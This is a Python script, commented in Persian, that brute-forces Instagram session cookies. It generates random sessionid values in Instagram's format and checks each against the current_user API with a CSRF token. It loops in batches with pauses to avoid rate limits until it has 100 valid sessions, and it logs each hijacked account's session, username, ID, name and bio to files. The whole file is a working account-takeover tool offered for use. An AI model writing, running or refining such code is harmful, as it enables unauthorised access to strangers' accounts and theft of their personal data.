import requests
import json
import re
import random
import string
import time
from datetime import datetime
import os

print("="*70)
print("🔍 پیداکننده سشن‌های معتبر اینستاگرام - نسخه ۲۴/۷")
print("="*70)
print(f"⏰ شروع: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print("="*70)

# ======================================================
# تنظیمات
# ======================================================

BATCH_SIZE = 20  # تعداد سشن در هر دسته
SLEEP_BETWEEN_BATCHES = 2  # ثانیه بین هر دسته
MAX_SESSIONS_PER_RUN = 1000  # حداکثر سشن در هر اجرا (برای جلوگیری از اجرای بی‌نهایت)

# ======================================================
# کلاس اصلی
# ======================================================

class InstagramSessionTester:
    def __init__(self):
        self.found_sessions = []
        self.total_tested = 0
        self.start_time = datetime.now()
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
        # ایجاد پوشه برای ذخیره نتایج
        os.makedirs('/tmp/results', exist_ok=True)

    def log(self, message):
        """نوشتن لاگ با زمان"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_msg = f"[{timestamp}] {message}"
        print(log_msg)
        # ذخیره لاگ در فایل
        with open('/tmp/results/log.txt', 'a') as f:
            f.write(log_msg + "\n")

    def generate_random_session(self):
        """تولید سشن رندوم با فرمت مشخص"""
        part1 = str(random.randint(10000000000, 99999999999))
        part2 = ''.join(random.choices(string.ascii_letters + string.digits, k=14))
        part3 = str(random.randint(10, 99))
        chars = string.ascii_letters + string.digits + '_'
        part4 = ''.join(random.choices(chars, k=random.randint(44, 48)))
        
        session_raw = f"{part1}:{part2}:{part3}:{part4}"
        session_encoded = session_raw.replace(':', '%3A')
        
        return session_encoded

    def test_single_session(self, session_id):
        """تست یک سشن"""
        try:
            session = requests.Session()
            session.headers.update(self.headers)
            
            session_raw = session_id.replace('%3A', ':')
            session.cookies.set("sessionid", session_raw)
            
            response = session.get("https://www.instagram.com/", timeout=8)
            
            if response.status_code != 200:
                return None
            
            csrf_token = None
            for cookie in session.cookies:
                if cookie.name == 'csrftoken':
                    csrf_token = cookie.value
                    break
            
            if not csrf_token:
                return None
            
            headers_api = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "X-IG-App-ID": "936619743392459",
                "X-Requested-With": "XMLHttpRequest",
                "X-CSRFToken": csrf_token,
                "Accept": "application/json",
                "Referer": "https://www.instagram.com/"
            }
            
            response = session.get(
                "https://www.instagram.com/api/v1/web/accounts/current_user/",
                headers=headers_api,
                timeout=8
            )
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    if 'user' in data:
                        user_info = data['user']
                        return {
                            'session_id': session_id,
                            'session_raw': session_raw,
                            'user_info': user_info,
                            'status': 'valid'
                        }
                except:
                    pass
            
            return None
            
        except Exception as e:
            return None

    def test_batch_sessions(self, sessions):
        """تست یک دسته سشن"""
        results = []
        for session_id in sessions:
            result = self.test_single_session(session_id)
            if result:
                results.append(result)
            time.sleep(0.5)  # کمی تأخیر بین تست‌ها
        return results

    def save_session(self, result):
        """ذخیره سشن معتبر"""
        if result:
            username = result['user_info'].get('username', 'نامشخص')
            user_id = result['user_info'].get('id', 'نامشخص')
            
            # ذخیره در فایل اصلی
            with open('/tmp/results/found_sessions.txt', 'a') as f:
                f.write(f"{result['session_id']}\n")
            
            # ذخیره با جزئیات
            with open('/tmp/results/found_sessions_details.txt', 'a') as f:
                f.write("="*60 + "\n")
                f.write(f"🕐 زمان: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"👤 کاربر: {username}\n")
                f.write(f"🆔 ID: {user_id}\n")
                f.write(f"🔑 سشن: {result['session_id']}\n")
                if 'full_name' in result['user_info']:
                    f.write(f"📝 نام کامل: {result['user_info']['full_name']}\n")
                if 'biography' in result['user_info']:
                    f.write(f"📖 بیوگرافی: {result['user_info']['biography'][:100]}\n")
                f.write("="*60 + "\n\n")
            
            self.found_sessions.append(result)
            
            # لاگ در کنسول
            self.log(f"🎉 سشن معتبر پیدا شد! کاربر: {username} (ID: {user_id})")
            self.log(f"🔑 سشن: {result['session_id'][:60]}...")
            
            return True
        return False

    def run(self):
        """اجرای اصلی برنامه"""
        self.log("🚀 شروع جستجوی سشن‌های معتبر...")
        self.log(f"📊 هر دسته: {BATCH_SIZE} سشن")
        
        total_batches = 0
        sessions_found = 0
        
        while len(self.found_sessions) < 100:  # تا ۱۰۰ سشن معتبر پیدا کند
            total_batches += 1
            
            # تولید سشن‌های جدید
            batch_sessions = [self.generate_random_session() for _ in range(BATCH_SIZE)]
            self.total_tested += BATCH_SIZE
            
            self.log(f"\n📦 دسته #{total_batches} - تست {BATCH_SIZE} سشن...")
            self.log(f"📊 کل تست شده: {self.total_tested}")
            self.log(f"✅ سشن‌های معتبر: {len(self.found_sessions)}")
            
            # تست سشن‌ها
            results = self.test_batch_sessions(batch_sessions)
            
            # ذخیره نتایج
            for result in results:
                if self.save_session(result):
                    sessions_found += 1
            
            # نمایش پیشرفت
            if results:
                self.log(f"🎯 در این دسته {len(results)} سشن معتبر پیدا شد!")
            else:
                self.log(f"❌ در این دسته سشن معتبری پیدا نشد")
            
            # ذخیره آماری
            with open('/tmp/results/stats.txt', 'w') as f:
                f.write(f"کل تست شده: {self.total_tested}\n")
                f.write(f"سشن‌های معتبر: {len(self.found_sessions)}\n")
                f.write(f"آخرین بروزرسانی: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            
            # اگر سشن جدیدی پیدا شد، لاگ ویژه
            if sessions_found > 0:
                self.log(f"💾 {sessions_found} سشن جدید در /tmp/results/ ذخیره شد!")
                sessions_found = 0
            
            # کمی استراحت بین دسته‌ها
            time.sleep(SLEEP_BETWEEN_BATCHES)
            
            # محدودیت برای جلوگیری از مصرف زیاد
            if self.total_tested >= MAX_SESSIONS_PER_RUN:
                self.log(f"⏹️ به {MAX_SESSIONS_PER_RUN} سشن رسیدیم، استراحت کوتاه...")
                time.sleep(60)  # ۱ دقیقه استراحت
                # ریست شمارنده برای ادامه
                self.total_tested = 0

# ======================================================
# اجرای اصلی
# ======================================================

if __name__ == "__main__":
    tester = InstagramSessionTester()
    
    try:
        tester.run()
    except KeyboardInterrupt:
        tester.log("⏹️ برنامه با دستور کاربر متوقف شد")
    except Exception as e:
        tester.log(f"❌ خطا: {e}")
    finally:
        # نمایش خلاصه نهایی
        tester.log("\n" + "="*70)
        tester.log("📊 خلاصه نهایی:")
        tester.log("="*70)
        tester.log(f"🔍 کل سشن‌های تست شده: {tester.total_tested}")
        tester.log(f"✅ سشن‌های معتبر پیدا شده: {len(tester.found_sessions)}")
        
        if tester.found_sessions:
            tester.log("\n📋 لیست سشن‌های معتبر:")
            for i, session in enumerate(tester.found_sessions, 1):
                username = session['user_info'].get('username', 'نامشخص')
                tester.log(f"{i}. 👤 {username} -> {session['session_id'][:50]}...")
        
        tester.log("\n" + "="*70)
        tester.log("✅ برنامه به پایان رسید!")
        tester.log("📁 فایل‌های خروجی در /tmp/results/ ذخیره شدند")
        tester.log("="*70)